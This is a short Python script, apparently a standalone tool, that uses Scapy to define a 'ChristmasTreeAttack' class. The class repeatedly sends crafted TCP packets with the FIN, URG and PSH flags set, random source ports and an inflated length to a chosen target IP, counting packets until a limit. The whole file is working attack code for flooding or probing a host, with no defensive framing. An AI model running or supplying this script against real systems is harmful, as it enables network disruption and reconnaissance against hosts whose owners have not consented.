from scapy.layers.inet import *
from scapy.packet import Raw
from scapy.all import *
from threading import Thread

host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)


class ChristmasTreeAttack:
    def __init__(self, dst_ip, dst_port):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.sending = True
        self.cta_count = 0
        self.data = "Christmas Tree ATTACK !!!"

    def christmas_tree_attack(self, count):
        while self.sending:
            christmas_tree_src = IP(src=host_ip, dst=self.dst_ip, len=2048) / \
                                 TCP(flags='FUP', sport=RandShort(), window=1500) / \
                                 Raw(load=self.data)
            send(christmas_tree_src)
            self.cta_count += 1
            print("Sent packet count: " + str(self.cta_count))
            if self.cta_count == count:
                break
